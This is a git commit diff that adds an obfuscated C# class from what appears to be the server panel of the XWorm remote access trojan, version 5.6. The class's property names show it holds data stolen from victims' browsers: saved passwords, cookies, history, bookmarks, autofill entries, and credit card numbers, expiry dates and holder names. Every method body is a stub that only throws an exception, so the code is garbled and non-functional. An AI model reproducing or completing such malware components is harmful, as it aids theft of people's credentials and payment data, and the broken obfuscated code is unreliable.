a3cb96b5bd8153b90dd572536b06c53b133e4091
h1ercarbohydratemap11 <xcytrizen@outlook.com>
2025-09-18 13:50:51 +0400

    Forms37.cs

---
+++ XWorm V5.6/Server/Forms/Forms37.cs
@@ -0,0 +1,121 @@
+﻿using I133EDD8311397I037I09A90I9D29E6F;
+using I6FBIC23A7A8A48C2F3BDF833D19D102;
+using IF0FF1FFB1CA752C08C9910B024F129F;
+using IFIA669D44A37BIIE7E4F11568D7603E;
+using M3D2EFMCBF161EM7051AD11C09FM858F;
+using M97E66DDC5D6FEDC246A7B4559E7CC3C;
+using System;
+using System.Collections.Generic;
+using System.Runtime.CompilerServices;
+
+namespace B05AAC3ADD985141D49864E664D6B340
+{
+  public class IB0IE77IC0523C898559B7ADB51A5085
+  {
+    public static int LB92AFBBEBLC9FC490ALC19EALLEF14L;
+    public static int L9F00538CE3L32DFF008FE3EEB4828L9;
+    public static int L33739L08179218L4E2CDC30C945D913;
+    public static int LL71F1CLD1FA0F97LC22A09859AFC114;
+    public static int D7B65EC5D8C29A19CAF6B54616FA2E98;
+    public static int L58AFDBLA8893FLDEAB9L975C8D77373;
+
+    public List<IID32DCI6I7B9802EBAB676I9B4E6BD9> listps
+    {
+      [CompilerGenerated, SpecialName, MethodImpl(MethodImplOptions.NoInlining)] get => throw new Exception("で");
+      [CompilerGenerated, SpecialName, MethodImpl(MethodImplOptions.NoInlining)] set => throw new Exception("ほ");
+    }
+
+    public List<IA0AD4B699F26I4B2F7CFCF52I427780> listcookie
+    {
+      [CompilerGenerated, SpecialName, MethodImpl(MethodImplOptions.NoInlining)] get => throw new Exception("ぁ");
+      [CompilerGenerated, SpecialName, MethodImpl(MethodImplOptions.NoInlining)] set => throw new Exception("と");
+    }
+
+    public List<IDD9EAACDE218374CBIBD65DF882F241> listhist
+    {
+      [CompilerGenerated, SpecialName, MethodImpl(MethodImplOptions.NoInlining)] get => throw new Exception("ぉ");
+      [CompilerGenerated, SpecialName, MethodImpl(MethodImplOptions.NoInlining)] set => throw new Exception("お");
+    }
+
+    public List<M1C7084379882725E50A3B90D77B29D9> listbmark
+    {
+      [CompilerGenerated, SpecialName, MethodImpl(MethodImplOptions.NoInlining)] get => throw new Exception("だ");
+      [CompilerGenerated, SpecialName, MethodImpl(MethodImplOptions.NoInlining)] set => throw new Exception("ぺ");
+    }
+
+    public List<M9624D6AM60E68CC779BM8C4B6M8FE24> listautofill
+    {
+      [CompilerGenerated, SpecialName, MethodImpl(MethodImplOptions.NoInlining)] get => throw new Exception("え");
+      [CompilerGenerated, SpecialName, MethodImpl(MethodImplOptions.NoInlining)] set => throw new Exception("い");
+    }
+
+    public List<E2D1C0BA3ED2E63FF199E562C1FB1D0D> listcredit
+    {
+      [CompilerGenerated, SpecialName, MethodImpl(MethodImplOptions.NoInlining)] get => throw new Exception("い");
+      [CompilerGenerated, SpecialName, MethodImpl(MethodImplOptions.NoInlining)] set => throw new Exception("ヱ");
+    }
+
+    [CompilerGenerated]
+    [SpecialName]
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    public string get_storeId() => throw new Exception("ん");
+
+    [CompilerGenerated]
+    [SpecialName]
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    public void set_storeId(string AutoPropertyValue) => throw new Exception("㍐");
+
+    [CompilerGenerated]
+    [SpecialName]
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    public string get_value() => throw new Exception("ゔ");
+
+    [CompilerGenerated]
+    [SpecialName]
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    public void set_value(string AutoPropertyValue) => throw new Exception("げ");
+
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    public IB0IE77IC0523C898559B7ADB51A5085() => throw new Exception("ど");
+
+    [CompilerGenerated]
+    [SpecialName]
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    public string get_sNumber() => throw new Exception("ゝ");
+
+    [CompilerGenerated]
+    [SpecialName]
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    public void set_sNumber(string AutoPropertyValue) => throw new Exception("れ");
+
+    [CompilerGenerated]
+    [SpecialName]
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    public string get_sExpYear() => throw new Exception("ほ");
+
+    [CompilerGenerated]
+    [SpecialName]
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    public void set_sExpYear(string AutoPropertyValue) => throw new Exception("ゎ");
+
+    [CompilerGenerated]
+    [SpecialName]
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    public string get_sExpMonth() => throw new Exception("あ");
+
+    [CompilerGenerated]
+    [SpecialName]
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    public void set_sExpMonth(string AutoPropertyValue) => throw new Exception("さ");
+
+    [CompilerGenerated]
+    [SpecialName]
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    public string get_sName() => throw new Exception("ぞ");
+
+    [CompilerGenerated]
+    [SpecialName]
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    public void set_sName(string AutoPropertyValue) => throw new Exception("に");
+  }
+}
